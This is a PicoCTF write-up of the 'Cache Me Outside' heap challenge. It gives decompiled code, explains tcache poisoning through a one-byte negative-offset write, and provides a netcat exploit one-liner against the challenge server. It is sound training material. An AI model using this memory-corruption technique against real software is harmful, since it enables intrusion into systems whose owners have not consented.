# 🧠 PicoCTF: Cache Me Outside

> **Category:** Binary Exploitation  
> **Vulnerability:** Heap Manipulation + One-Byte Overwrite  
> **Concepts:** Tcache Poisoning, Arbitrary Memory Write, Heap Metadata Abuse

---

## 🔎 Overview

You're given a binary that allows you to **edit one byte** of memory at a controlled offset from a heap-allocated buffer. The flag is read into memory and stored in multiple heap chunks. Your goal is to exploit this one-byte overwrite to **redirect a heap allocation** and cause the flag to be printed.

---

## 📜 Decompiled Code (Vulnerable Logic)

```c
stream = fopen("flag.txt", "r");
fgets(s, 64, stream);  // Flag read into buffer `s`

// Allocate 7 chunks on heap with "Congrats! Your flag is: <flag>"
for (i = 0; i <= 6; ++i) {
    dest = malloc(0x80);
    if (!v8) v8 = dest;  // Save first chunk pointer
    *(_QWORD *)dest = 0x73746172676E6F43; // "Congrats"
    strcpy(dest + 8, "! Your flag is: ");
    strcat(dest, s);  // Append flag
}

v11 = malloc(0x80);
strcpy(v11, "Sorry! This won't help you: ");
strcat(v11, src);

free(dest);  // Free 7th flag chunk
free(v11);   // Free decoy chunk

puts("You may edit one byte in the program.");
scanf("%d", &v6);  // Read offset
scanf(" %c", &v5); // Read byte value

v8[v6] = v5;  // 🧨 One-byte arbitrary write

v12 = malloc(0x80);  // Reuses freed chunk
puts(v12 + 16);      // 🟢 Print data at v12 + 16
```

---

## ⚠️ Vulnerability Explained

### ❗ One-byte Arbitrary Write

- The program allows you to write `v5` at `v8[v6]`.
- Since `v6` is **signed**, you can give a **negative value**, writing **before** the heap buffer.

### 📌 Key Insight

- After freeing two chunks, the freed chunk addresses are stored in the **tcache freelist**.
- That free list is a singly linked list, each entry storing a pointer to the next chunk (`fd`).
- By overwriting the **least significant byte** of a freed chunk pointer (in tcache), you can **redirect** `malloc()` to return a controlled chunk.

---

## 🧠 Exploitation Strategy

### 🎯 Goal:
Make the next `malloc(0x80)` return a chunk that already contains:
```
Congrats! Your flag is: <flag>
```

### 💡 How?
- Overwrite the **LSB** of the first `tcache` entry using:
  ```c
  v8[-5144] = '\x00';
  ```
- This aligns the pointer to point to an earlier heap chunk containing the flag message.
- The next `malloc(0x80)` returns that chunk.
- Since the program does:
  ```c
  puts(v12 + 16);
  ```
  it **prints the flag**, skipping the `"Congrats! Your "` prefix.

---

## ✅ Final Exploit Command

```bash
{ echo "-5144"; printf "\x00"; } | nc mercury.picoctf.net 34499
```

### 🟢 Output:
```
You may edit one byte in the program.
Address: Value: 
flag is: picoCTF{--------------------------}
```

### 🔍 Why It Works:

| Step | What Happens |
|------|---------------|
| `-5144` | Writes **5144 bytes before `v8`** into tcache freelist |
| `\x00`  | Null-byte write to LSB of a freelist pointer |
| `malloc(0x80)` | Returns flag-containing chunk |
| `puts(v12 + 16)` | Skips 16 bytes and prints the flag |

---

## 🏁 Conclusion

By understanding the heap layout and exploiting a **one-byte arbitrary write**, we redirected the heap allocator to return a chunk that already held the flag, leading to successful exfiltration of the secret. This is a classic example of **tcache poisoning with a one-byte overflow**.

